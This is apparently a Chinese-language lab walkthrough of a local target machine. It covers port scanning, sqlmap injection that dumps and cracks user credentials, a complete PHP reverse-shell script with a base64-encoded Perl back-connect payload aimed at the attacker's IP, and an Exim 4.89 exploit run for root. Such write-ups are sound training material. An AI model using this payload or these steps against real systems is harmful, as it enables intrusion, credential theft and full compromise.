# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747328532-8fdc13fc-3551-478e-a23f-5b5c3c3a04ed.png#averageHue=%2329313d&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=323&id=ueca1960b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100264&status=done&style=none&taskId=uf4cd4f6f-28f5-445c-b1ea-391710a5c3e&title=&width=1169)
nmap -p- -A 192.168.31.150
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747361817-4f230afb-dc61-436d-8491-9159f2d99ba3.png#averageHue=%2328313e&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=386&id=u0ddca329&margin=%5Bobject%20Object%5D&name=image.png&originHeight=386&originWidth=1216&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110877&status=done&style=none&taskId=u12da2139-d9b5-40ca-9686-c54525d7f0c&title=&width=1216)
# web 突破
dirb 扫后台
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668748341308-175be48b-af73-4ff4-bfcc-66164a5f0551.png#averageHue=%232d3a4a&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=201&id=ud21f4b39&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75588&status=done&style=none&taskId=u8cbf3fa1-7812-44c1-907e-b8572fae0a3&title=&width=625)
有个 user ，是登陆界面
访问 80 端口，随便点击后发现 url 变化
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747603908-5fdd2058-e3e5-44a4-9d6e-2e93ac2a9361.png#averageHue=%23d2d2cf&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=917&id=u95ea1ab6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=917&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108344&status=done&style=none&taskId=udff161cb-aae8-4e96-9ec3-c65893a3c98&title=&width=1920)
?nid=1
想到 sql 注入
扫描当前使用的数据库：
sqlmap -u "http://192.168.31.150/?nid=1" --current-db --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747818631-6a426166-e1dd-476e-ba93-2dc4e15ffdde.png#averageHue=%2329323f&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=195&id=u1d49d8df&margin=%5Bobject%20Object%5D&name=image.png&originHeight=195&originWidth=960&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60044&status=done&style=none&taskId=udef75607-13a2-4633-acde-6ee922bee54&title=&width=960)
当前数据库为 d7db
扫描数据库中的表
sqlmap -u "http://192.168.31.150/?nid=1" -D "d7db" --tables --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747896440-59eb1947-c95e-47f2-9c94-c134a07456a5.png#averageHue=%23283342&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=490&id=ue173fcee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=490&originWidth=403&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28999&status=done&style=none&taskId=u6f8ae7be-5655-459c-9ca7-77c2e5778fc&title=&width=403)
表有点多，扫 users 表的字段
sqlmap -u "http://192.168.31.150/?nid=1" -D "d7db" -T "users" --columns --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747948718-cb030b0e-c803-49db-8f63-a2d4f754ae08.png#averageHue=%23262e3a&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=467&id=u50d15a80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=467&originWidth=1236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97727&status=done&style=none&taskId=uf9123592-ec6d-4d65-88ac-5fd563f03f6&title=&width=1236)
dump 出 name 和 pass 字段
sqlmap -u "http://192.168.31.150/?nid=1" -D "d7db" -T "users" -C "name,pass" --dump --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668747999820-3bb5af34-6c98-4515-b5cf-3a85063fcadf.png#averageHue=%23293442&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=277&id=uca18cf60&margin=%5Bobject%20Object%5D&name=image.png&originHeight=277&originWidth=673&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65336&status=done&style=none&taskId=ude44257b-c65e-45bd-8c14-b141b1e451b&title=&width=673)
使用 john 解密
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668748132259-e3fe8a0a-3c1c-423e-b589-e47b79af3c5e.png#averageHue=%23293340&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=444&id=u22fe5819&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129063&status=done&style=none&taskId=u566d4ac8-1b22-4910-a72a-39a4cf76d24&title=&width=929)
得到一个账户 john：turtle
admin 解不出来
去 /user 登录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668748393333-bc41ca08-5c11-4c78-b01a-10fb208c6eb1.png#averageHue=%23f4f2e1&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=590&id=u737cb5c9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=1159&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47404&status=done&style=none&taskId=u1798884c-c6b3-469c-a282-080868bf42a&title=&width=1159)
登录成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668748418184-ab2393d5-c9b1-469d-84b8-4091ca43bff3.png#averageHue=%23b7b7b4&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=783&id=u65dded4b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=783&originWidth=1539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59481&status=done&style=none&taskId=ue657d35b-b301-4461-82f6-1be30b157f9&title=&width=1539)
主页 Contact us -> Webform -> Form settings 可以编辑内容
写入 反弹 shell
反弹 shell：
```php
<?php
function which($pr) {
$path = execute("which $pr");
return ($path ? $path : $pr);
}
function execute($cfe) {
$res = '';
if ($cfe) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
$yourip = "192.168.31.128"; 
$yourport = '4444';
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?>

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668749322412-a52f5c0c-e297-4369-b791-df1f91a2820a.png#averageHue=%23d6d5d2&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=759&id=u5ca016bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=759&originWidth=1918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103961&status=done&style=none&taskId=u038d285d-8ec0-444b-9493-29eed548a5e&title=&width=1918)
保存，kali 开启监听
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668749335587-1472517e-a6d4-4753-9919-09ac8fa4f563.png#averageHue=%23283240&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=149&id=u7d6564a2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25809&status=done&style=none&taskId=ude60cfa7-8d46-4e74-bb1a-6efc97a3b8b&title=&width=581)
连接成功
python 优化 shell
python -c 'import pty;pty.spawn("/bin/bash")'
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668749392512-b36d166b-f27c-4883-a25b-fe60b6232cb4.png#averageHue=%232b3644&clientId=u7c515975-21e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=53&id=ud3c6f0f4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=53&originWidth=435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8519&status=done&style=none&taskId=u77f3c50c-fb2b-4ea9-b292-77aca8b508c&title=&width=435)
# 提权
find / -perm -u=s -type f 2>/dev/null  或 find / -user root -perm -4000 -print 2>/dev/null
find 查找具有 suid 权限的命令
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668749732123-534af2c9-c69c-47c0-b198-fc7f4cb48d9d.png#averageHue=%23262f3c&clientId=ub642a172-374c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=292&id=u4e39bc7f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=292&originWidth=676&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45720&status=done&style=none&taskId=ua8671cea-8268-47b9-a040-25f085c8efa&title=&width=676)
exim4 没见过
_ Exim是一个MTA（_**_Mail Transfer Agent，邮件传输代理_**_）服务器软件，该软件基于_[_GPL协议_](https://baike.baidu.com/item/GPL%E5%8D%8F%E8%AE%AE?fromModule=lemma_inlink)_开发，是一款_[_开源软件_](https://baike.baidu.com/item/%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6/8105369?fromModule=lemma_inlink)_。该软件主要运行于_[_类UNIX系统_](https://baike.baidu.com/item/%E7%B1%BBUNIX%E7%B3%BB%E7%BB%9F?fromModule=lemma_inlink)_。通常该软件会与_[_Dovecot_](https://baike.baidu.com/item/Dovecot?fromModule=lemma_inlink)_或Courier等软件搭配使用。Exim同时也是“进出口”（_**_Export-Import_**_）的英文缩写。  _
searchsploit exim
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668749931153-63ac878d-dd83-4c38-9939-42c85674b9e5.png#averageHue=%232a3340&clientId=u5ea168b1-3808-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=482&id=u6c77b5b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=482&originWidth=1179&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182473&status=done&style=none&taskId=u3f35990e-4450-499c-be27-001b12306a6&title=&width=1179)
不知道 exim 的版本，所以不知道用哪个
回到靶机，查看版本
exim --version
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668749996522-72340e78-6e39-4144-a3fc-486e2c00b847.png#averageHue=%232b3543&clientId=u5ea168b1-3808-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=298&id=ufc097ece&margin=%5Bobject%20Object%5D&name=image.png&originHeight=298&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80577&status=done&style=none&taskId=u8ea8a6d2-95be-4572-b7f7-250c98a2c92&title=&width=701)
exim 4.89
回到 kali 
cp 
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668750218396-3a13a6c6-b7ea-4815-ae6e-1a77652629cb.png#averageHue=%2327313d&clientId=u5ea168b1-3808-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=128&id=ud14db7a2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32281&status=done&style=none&taskId=ue0d79d0c-1614-4cb4-a439-bf6b043e4ce&title=&width=1009)
dos2unix 转换文件（使 windows 代码可以在 unix 上运行）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668750273439-beaf87d3-0417-49a6-9e31-fef13c092f28.png#averageHue=%232a3341&clientId=u5ea168b1-3808-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=112&id=u16c0d892&margin=%5Bobject%20Object%5D&name=image.png&originHeight=112&originWidth=438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20381&status=done&style=none&taskId=ufe8e962c-3e8e-4471-b08c-6c982eb69e5&title=&width=438)
kali 开启 http 服务
python3 -m http.server 8001
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668750914767-f3261881-aa3a-49fb-99fd-63f84004dd33.png#averageHue=%23293341&clientId=ufad91281-d85b-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=127&id=ub7cbb133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=127&originWidth=694&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27874&status=done&style=none&taskId=u0547f50c-c147-4740-a9f2-dda13508920&title=&width=694)
靶机下载 脚本（切换到 /tmp 下下载，家目录不让写入，无权限）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668750939700-6c375473-a3b3-4c81-aae6-fd752408b6c3.png#averageHue=%2329323f&clientId=ufad91281-d85b-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=280&id=u884366f5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56664&status=done&style=none&taskId=uc166e4dc-2f8b-4709-8648-37ce26fd034&title=&width=686)
赋权并执行脚本
chmod 777 46996.sh
./46996.sh -m netcat  （有时候会掉，重新运行即可）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668751052496-295b2177-0e51-4c03-9935-fea1ca4f7e84.png#averageHue=%2328313e&clientId=ufad91281-d85b-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=417&id=ue0b02b48&margin=%5Bobject%20Object%5D&name=image.png&originHeight=417&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77877&status=done&style=none&taskId=u8fddd9dc-c47e-4a66-8891-88fa451db81&title=&width=626)
提权成功，拿 flag
cd /root
ls
cat flag.txt
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668751148503-9d6ab3bd-63a6-49dc-8568-ab20042186ba.png#averageHue=%23293340&clientId=ufad91281-d85b-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=489&id=u354f4205&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78934&status=done&style=none&taskId=u930986cb-eec0-4250-9cb5-51d291b6326&title=&width=1025)
